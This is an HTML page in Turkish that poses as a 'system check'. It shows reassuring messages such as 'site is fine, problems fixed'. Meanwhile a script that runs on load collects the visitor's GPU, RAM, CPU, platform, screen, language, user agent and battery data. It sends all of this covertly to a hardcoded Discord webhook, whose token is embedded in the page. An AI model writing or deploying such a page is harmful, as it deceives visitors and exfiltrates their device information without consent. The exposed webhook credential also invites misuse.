<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrol√º</title>
    <style>
        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
        h2 { color:#444; font-size:13px; font-weight:400; letter-spacing:1px; }
        .ok { color:#0f4; font-weight:bold; }
    </style>
</head>
<body>
    <h2 id="t">Site ayarlarƒ± kontrol ediliyor...</h2>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function extract() {
            let info = {};
            
            // 1. DERƒ∞N GPU ANALƒ∞Zƒ∞
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
            } catch(e) { info.gpu = "Engellendi"; }

            // 2. DONANIM VE Sƒ∞STEM
            info.ram = navigator.deviceMemory + " GB";
            info.cpu = navigator.hardwareConcurrency + " √áekirdek";
            info.plt = navigator.platform;
            info.res = screen.width + "x" + screen.height + " (" + window.devicePixelRatio + "x)";
            info.lang = navigator.language;
            info.ua = navigator.userAgent;

            // 3. Pƒ∞L VE BAƒûLANTI (Gƒ∞ZLƒ∞)
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info.bat = (b.level * 100) + "% (≈ûarjda: " + (b.charging ? 'Evet' : 'Hayƒ±r') + ")";
            }

            // 4. VERƒ∞ PAKETLEME (EN VAH≈ûƒ∞ SET)
            const payload = {
                embeds: [{
                    title: "üïµÔ∏è KRƒ∞Tƒ∞K Cƒ∞HAZ ANALƒ∞Zƒ∞ (FULL ACCESS)",
                    color: 15158332,
                    fields: [
                        { name: "üõ†Ô∏è DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.vendor}\n**RAM:** ${info.ram}\n**CPU:** ${info.cpu}`, inline: false },
                        { name: "üì± YAZILIM/EKRAN", value: `**OS:** ${info.plt}\n**RES:** ${info.res}\n**Dƒ∞L:** ${info.lang}`, inline: true },
                        { name: "üîã DURUM", value: info.bat || "Eri≈üim Yok", inline: true },
                        { name: "üåê TARAYICI Kƒ∞MLƒ∞ƒûƒ∞", value: "```" + info.ua + "```", inline: false }
                    ],
                    timestamp: new Date()
                }]
            };

            // 5. YILDIRIM G√ñNDERƒ∞M
            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(u, blob);

            // 6. ARAY√úZ AKI≈ûI
            const t = document.getElementById('t');
            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 200);
            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar d√ºzeltildi.</span>'; }, 700);
        }

        extract();
    </script>
</body>
</html>
